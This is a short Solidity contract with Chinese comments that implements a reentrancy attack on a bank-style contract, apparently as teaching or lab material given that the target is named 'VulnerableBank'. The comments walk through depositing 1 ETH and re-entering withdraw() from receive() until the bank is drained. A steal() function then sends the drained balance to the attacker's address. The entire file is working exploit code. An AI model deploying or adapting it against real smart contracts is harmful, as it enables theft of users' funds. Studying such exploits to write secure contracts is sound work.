// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

// 重入攻击合约
// 攻击流程：
// 1. 攻击者调用 attack()，先往银行存 1 ETH（拿到存款记录）
// 2. 调用 bank.withdraw() 取回 1 ETH
// 3. bank 转账给攻击合约 -> 触发 receive() -> receive() 里再次调用 bank.withdraw()
// 4. 此时 bank 的 balances 还没清零，所以又能取 1 ETH
// 5. 循环往复，直到把银行榨干
contract ReentrancyAttack {
    IVulnerableBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    // 攻击入口：先存款再触发重入
    function attack() public payable {
        require(msg.value >= 1 ether, "need 1 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw(); // 触发重入
    }

    // receive：被银行转账触发时再次调用 withdraw
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // 重入！
        }
    }

    // 把偷到的钱转给 owner
    function steal() public {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
